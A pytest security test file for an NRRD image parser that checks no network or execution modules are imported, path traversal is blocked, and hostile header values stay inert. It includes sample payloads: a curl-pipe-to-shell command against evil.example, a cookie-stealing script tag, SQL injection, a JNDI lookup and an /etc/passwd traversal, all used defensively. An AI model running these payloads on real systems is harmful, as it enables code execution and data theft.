"""NRRD-SEC-001 -- resolver policy, hostile embedded content, and complexity
budgets.

MUST (SAL-NRRD-OBL-24B57E6A78478DB0): "Never resolve network resources,
execute embedded code, load plugins, or follow external references during
load, validate, or save unless explicitly enabled by the caller."

MUST (SAL-NRRD-OBL-9AB0A32906D88688): "Treat all embedded payloads (scripts,
styles, binary blobs, signatures) as untrusted data; parsing must not
evaluate them."

MUST (SAL-NRRD-OBL-2A95CBAA35F7BB05 / SAL-NRRD-OBL-38C2DECC64DF5145):
"Provide configurable limits for input size, nesting depth, element/record
count, and total decoded payload bytes... use checked arithmetic for size and
count calculations and bound recursion depth."

Before this slice: these 4 obligations each carried a precise, specific gap
description but no dedicated security test file existed for nrrd at all.
"""

from __future__ import annotations

import ast
from pathlib import Path

import pytest
from format_factory.core import ResourceLimitError, ResourceLimits
from format_factory.nrrd import loads

_SRC_ROOT = Path(__file__).resolve().parents[3] / "src" / "python" / "nrrd" / "src"

_FORBIDDEN_MODULES = frozenset(
    {
        "socket",
        "urllib",
        "http",
        "ftplib",
        "smtplib",
        "subprocess",
        "importlib",
        "pkgutil",
        "ctypes",
    }
)


def _header(fields: str, *, comments: str = "", payload: bytes = b"\x00\x00") -> bytes:
    return ("NRRD0005\n" + comments + fields.rstrip("\n") + "\n\n").encode() + payload


# ── No network, execution, or plugin capability exists anywhere ────────────


def test_no_source_file_imports_networking_execution_or_plugin_modules() -> None:
    """Static, whole-package proof: nothing in this library can resolve a
    network resource, execute embedded code, or dynamically load a plugin,
    because the modules that would do so are never imported anywhere."""
    offenders: list[str] = []
    for path in _SRC_ROOT.rglob("*.py"):
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            names: list[str] = []
            if isinstance(node, ast.Import):
                names = [alias.name.split(".")[0] for alias in node.names]
            elif isinstance(node, ast.ImportFrom) and node.module:
                names = [node.module.split(".")[0]]
            for name in names:
                if name in _FORBIDDEN_MODULES:
                    offenders.append(f"{path}: {name}")

    assert offenders == []


def test_detached_path_resolution_is_the_only_external_reference_and_stays_confined(
    tmp_path: Path,
) -> None:
    """The one external-reference mechanism NRRD has -- a detached data file
    -- is resolved relative to the header's own directory and refuses to
    escape it, never touching anything the caller did not already point at."""
    header_path = tmp_path / "h.nhdr"
    header_path.write_bytes(
        _header(
            "type: uint8\ndimension: 1\nsizes: 2\nencoding: raw\n"
            "data file: ../../etc/passwd"
        )
    )

    from format_factory.nrrd import load
    from format_factory.nrrd.errors import NrrdParseError

    with pytest.raises(NrrdParseError, match="unsafe|escapes"):
        load(header_path)


# ── Embedded content is opaque data, never evaluated ────────────────────────


def test_hostile_key_value_content_survives_as_opaque_string() -> None:
    document = loads(
        _header(
            "type: uint8\ndimension: 1\nsizes: 2\nencoding: raw\n"
            'vendor:=$(curl evil.example/x | sh)\n'
            "script:=<script>alert(document.cookie)</script>"
        )
    )

    assert document.key_value_pairs["vendor"] == "$(curl evil.example/x | sh)"
    assert (
        document.key_value_pairs["script"]
        == "<script>alert(document.cookie)</script>"
    )


def test_hostile_comment_content_survives_as_opaque_string() -> None:
    document = loads(
        _header(
            "type: uint8\ndimension: 1\nsizes: 2\nencoding: raw\n",
            comments="# '; DROP TABLE tensors; --\n# ${jndi:ldap://evil/a}\n",
        )
    )

    assert "'; DROP TABLE tensors; --" in document.comments
    assert "${jndi:ldap://evil/a}" in document.comments


# ── Complexity budgets: checked arithmetic and bounded counts ───────────────


def test_axis_count_is_bounded_by_max_entries() -> None:
    header = _header("type: uint8\ndimension: 3\nsizes: 2 2 2\nencoding: raw")

    with pytest.raises(ResourceLimitError, match="max_entries"):
        loads(header, limits=ResourceLimits(max_entries=2))


def test_element_count_multiplication_is_checked_against_the_decompressed_ceiling() -> (
    None
):
    """Per-axis sizes that are individually plausible but multiply past the
    decompressed-bytes ceiling must be rejected by checked arithmetic before
    any allocation, not overflow or hang."""
    header = _header(
        "type: uint8\ndimension: 3\n"
        "sizes: 999999999 999999999 999999999\nencoding: raw"
    )

    with pytest.raises(ResourceLimitError, match="resource limits"):
        loads(header)
